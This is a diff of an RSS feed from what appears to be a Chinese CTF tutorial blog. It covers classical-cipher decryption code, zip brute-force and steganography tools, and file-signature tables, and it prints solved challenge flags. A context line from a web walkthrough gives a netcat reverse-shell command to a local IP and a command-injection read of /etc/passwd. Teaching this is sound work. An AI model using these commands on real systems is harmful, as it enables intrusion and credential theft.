+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rail_fence_by_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;✅ 行数&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;解密结果：&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 最终结果提示&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;❌ 未找到以flag开头的解密结果&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 主程序入口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 输入密文（请准确粘贴你要解密的内容）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cipher_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;请输入需要解密的密文字符串：&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cipher_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;❌ 输入不能为空！&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;find_flag_universal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;zipcracker&#34;&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;ZipCracker&lt;/font&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;介绍-3&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;ZipCracker是一个用python语言写的zip工具，集成了伪加密修复和字典爆破的功能，使用方法也很简单：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;伪加密识别及修复：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 ZipCracker.py test01.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;暴力破解-内置字典：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 ZipCracker.py test02.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;暴力破解-自定义字典：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 ZipCracker.py test02.zip YourDict.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;项目地址：&lt;a class=&#34;link&#34; href=&#34;https://github.com/asaotomo/ZipCracker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GitHub - asaotomo/ZipCracke&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;例题fakezip&#34;&gt;例题：fakezip
+&lt;/h3&gt;&lt;p&gt;在大部分情况下，目前的解压软件已经集成了伪加密修复功能，所以直接双击打开文件即可&lt;/p&gt;
+&lt;p&gt;得到flag为&lt;code&gt;flag{39281de6-fe64-11ea-adc1-0242ac120002}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;snowexe&#34;&gt;SNOW.EXE
+&lt;/h2&gt;&lt;h3 id=&#34;介绍-4&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;snow是一种将内容转为ASSCI码并写在文件末尾的文本形式，由于这类文件用记事本打开后通常会有大段空格或空行，所以亦称为“空白隐写法”。而snow,exe则是针对这种隐写法的加解密工具，这里我们只介绍解密的使用方法：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snow.exe -C -p 密码 解密文件.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;例题雪&#34;&gt;例题：雪
+&lt;/h3&gt;&lt;p&gt;下载得到&lt;code&gt;snow123.txt&lt;/code&gt;，因此猜测密码即为&lt;code&gt;snow123&lt;/code&gt;，故执行命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snow.exe -C -p snow123 snow123.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到flag为：&lt;code&gt;flag{welcome_to_yzu_ctf_adventure}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;隐形水印工具&#34;&gt;隐形水印工具
+&lt;/h2&gt;&lt;h3 id=&#34;介绍-5&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;这种隐写使用的是叫做“盲水印”的技术，可在不影响视觉观感的情况下给图片加上水印，通常用于资产保护。&lt;/p&gt;
+&lt;h3 id=&#34;例题watermark&#34;&gt;例题：watermark
+&lt;/h3&gt;&lt;p&gt;在工具中打开图片即可&lt;/p&gt;
+&lt;p&gt;得flag为：&lt;code&gt;flag{curiosity_is_the_key_to_success}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;不过一般情况下盲水印的题目会给两张图片，只不过这里的只给了一张图片并且没有隐藏文件包含，有点奇怪。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>1. CTF简介和常见文件头尾</title>
+        <link>https://www.retr0.xyz/p/1.-ctf%E7%AE%80%E4%BB%8B%E5%92%8C%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE/</link>
+        <pubDate>Thu, 05 Mar 2026 23:11:23 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.-ctf%E7%AE%80%E4%BB%8B%E5%92%8C%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE/</guid>
+        <description>&lt;h2 id=&#34;ctf简介&#34;&gt;CTF简介
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;CTF(Capture The Flag)一般译作“夺旗赛”，在网络安全领域中指网络安全技术人员之间进行技术竞技的一种比赛形式。通过各种攻击手法，获取服务器后寻找指定的字段，或者文件中某一个固定格式的字段，这个字段叫做Flag，其形式一般为&lt;code&gt;Flag{xxxxxxxX}&lt;/code&gt;，提交到裁判机就可以得分。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;常见题型&#34;&gt;常见题型
+&lt;/h3&gt;&lt;h4 id=&#34;pwn漏洞利用&#34;&gt;Pwn（漏洞利用）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：栈溢出、ROP、shellcode、堆、权限提升&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;攻击二进制程序&lt;/strong&gt;，拿到服务器权限 / 读取 flag&lt;/li&gt;
+&lt;li&gt;典型场景：
+&lt;ul&gt;
+&lt;li&gt;栈溢出覆盖返回地址&lt;/li&gt;
+&lt;li&gt;格式化字符串漏洞&lt;/li&gt;
+&lt;li&gt;UAF、double free 等堆漏洞&lt;/li&gt;
+&lt;li&gt;绕过保护：ASLR、Canary、NX、PIE、RELRO&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：pwntools、gdb-peda、IDA、objdump&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;reverse逆向工程&#34;&gt;Reverse（逆向工程）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：反汇编、脱壳、算法还原、混淆&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;把二进制 / 程序变回逻辑&lt;/strong&gt;，找到藏在里面的 flag&lt;/li&gt;
+&lt;li&gt;典型任务：
+&lt;ul&gt;
+&lt;li&gt;看汇编，还原加密 / 校验算法&lt;/li&gt;
+&lt;li&gt;脱壳、去混淆&lt;/li&gt;
+&lt;li&gt;分析注册机、验证逻辑&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：IDA Pro、Ghidra、x64dbg、OllyDbg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;web网页安全&#34;&gt;Web（网页安全）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：SQL 注入、XSS、文件上传、RCE、SSRF&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;攻击网站 / 服务器&lt;/strong&gt;，拿到 flag&lt;/li&gt;
+&lt;li&gt;最常考：
+&lt;ul&gt;
+&lt;li&gt;SQL 注入&lt;/li&gt;
+&lt;li&gt;文件上传 getshell&lt;/li&gt;
+&lt;li&gt;XSS 盗 cookie&lt;/li&gt;
+&lt;li&gt;SSRF 打内网&lt;/li&gt;
+&lt;li&gt;命令执行 / 代码执行&lt;/li&gt;
+&lt;li&gt;文件包含、弱口令、目录遍历&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：Burp Suite、sqlmap、dirsearch&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;crypto密码学&#34;&gt;Crypto（密码学）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：RSA、AES、异或、编码、古典密码&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;破解加密 / 编码&lt;/strong&gt;，还原明文&lt;/li&gt;
+&lt;li&gt;常见题型：
+&lt;ul&gt;
+&lt;li&gt;各种编码：Base64、Hex、ASCII、摩斯&lt;/li&gt;
+&lt;li&gt;古典密码：凯撒、维吉尼亚、栅栏&lt;/li&gt;
+&lt;li&gt;简单异或、流密码误用&lt;/li&gt;
+&lt;li&gt;RSA 小指数、共模、低加密指数、因数分解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：Python、CyberChef、openssl&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;misc杂项&#34;&gt;Misc（杂项）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：隐写、流量分析、压缩包、取证、脑洞&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CTF 里&lt;strong&gt;最杂、最灵活&lt;/strong&gt;的一类&lt;/li&gt;
+&lt;li&gt;常见方向：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;隐写&lt;/strong&gt;：图片 / 音频里藏信息（LSB 最常见）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;流量分析&lt;/strong&gt;：pcap 包找密码、flag&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;取证&lt;/strong&gt;：日志、内存镜像、磁盘文件恢复&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;压缩包破解&lt;/strong&gt;：伪加密、zip 明文攻击&lt;/li&gt;
+&lt;li&gt;各种脑洞：二维码、脑电波、游戏外挂、编程小脚本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：Wireshark、StegSolve、binwalk、foremost&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;blockchain区块链&#34;&gt;Blockchain（区块链）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：Solidity、智能合约、重入、溢出&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;攻击以太坊等智能合约&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;常见：
+&lt;ul&gt;
+&lt;li&gt;合约溢出、重入漏洞&lt;/li&gt;
+&lt;li&gt;权限控制、逻辑漏洞&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：Remix、web3.py&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;mobile移动安全&#34;&gt;Mobile（移动安全）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关键词：安卓逆向、脱壳、Frida、so 层逆向&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标：&lt;strong&gt;搞安卓 /iOS APP&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;典型：
+&lt;ul&gt;
+&lt;li&gt;反编译 APK，改代码&lt;/li&gt;
+&lt;li&gt;脱壳、Frida hook&lt;/li&gt;
+&lt;li&gt;so 库逆向（类似 reverse + pwn）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;工具：Apktool、Jadx、Frida、IDA&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;一些练习站&#34;&gt;一些练习站
+&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.nssctf.cn/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;NSSCTF | 在线CTF平台&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://adworld.xctf.org.cn/home/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;攻防世界&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/login?next=%2Fuser%3F&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;BUUCTF在线评测&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://ctf.show/login?next=%2Fchallenges%3F&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ctf.show&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://ctf.bugku.com/index.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;首页 - Bugku CTF平台&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.ichunqiu.com/competition&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CTF大本营 - 网络安全竞赛服务平台-i春秋&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;预制虚拟机&#34;&gt;预制虚拟机
+&lt;/h3&gt;&lt;p&gt;已预安装大部分所需工具：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1S3Gc4DuCj7nbE3XH4n9jYg?pwd=7z65&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1S3Gc4DuCj7nbE3XH4n9jYg?pwd=7z65&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;常见文件头尾&#34;&gt;常见文件头/尾
+&lt;/h2&gt;&lt;h3 id=&#34;图片类&#34;&gt;图片类
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;PNG&lt;/strong&gt;头：&lt;code&gt;89 50 4E 47&lt;/code&gt;尾：&lt;code&gt;49 45 4E 44 AE 42 60 82&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;JPG/JPEG&lt;/strong&gt;头：&lt;code&gt;FF D8 FF&lt;/code&gt;尾：&lt;code&gt;FF D9&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;GIF&lt;/strong&gt;头：&lt;code&gt;47 49 46 38&lt;/code&gt;（GIF89a/GIF87a）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;BMP&lt;/strong&gt;头：&lt;code&gt;42 4D&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;压缩包&#34;&gt;压缩包
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ZIP&lt;/strong&gt;头：&lt;code&gt;50 4B 03 04&lt;/code&gt;尾：&lt;code&gt;50 4B 05 06&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;RAR&lt;/strong&gt;头：&lt;code&gt;52 61 72 21 1A 07 00&lt;/code&gt;（RAR5 另一种）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;7Z&lt;/strong&gt;头：&lt;code&gt;37 7A BC AF 27 1C&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;文档--可执行&#34;&gt;文档 / 可执行
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;**ELF（Linux 程序）**头：&lt;code&gt;7F 45 4C 46&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;**PE（Windows exe/dll）**头：&lt;code&gt;4D 5A 90 00&lt;/code&gt;（MZ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PDF&lt;/strong&gt;头：&lt;code&gt;25 50 44 46&lt;/code&gt;（%PDF）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;音频--流量&#34;&gt;音频 / 流量
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;WAV&lt;/strong&gt;头：&lt;code&gt;52 49 46 46&lt;/code&gt;（RIFF）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PCAP&lt;/strong&gt;头：&lt;code&gt;D4 C3 B2 A1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PCAPNG&lt;/strong&gt;头：&lt;code&gt;0A 0D 0D 0A&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;常用文本--其他&#34;&gt;常用文本 / 其他
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;FFmpeg 伪文件&lt;/strong&gt;头：&lt;code&gt;46 4F 52 4D&lt;/code&gt;（FORM）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;TXT / 无格式&lt;/strong&gt;多为可见 ASCII，无固定头&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         <item>
@@ -1641,7 +2194,7 @@
 &lt;p&gt;&lt;strong&gt;拓展：&lt;/strong&gt; 也可以传入webshell回弹命令&lt;code&gt;nc+-e+/bin/bash+192.168.80.153+4444&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;需要提前打开na监听4444端口&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;我们修改命令查看一下有哪些用户：&lt;code&gt;&amp;lt;font style=&amp;quot;color:rgb(51, 51, 51);&amp;quot;&amp;gt;cat /etc/passwd&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;/p&gt;
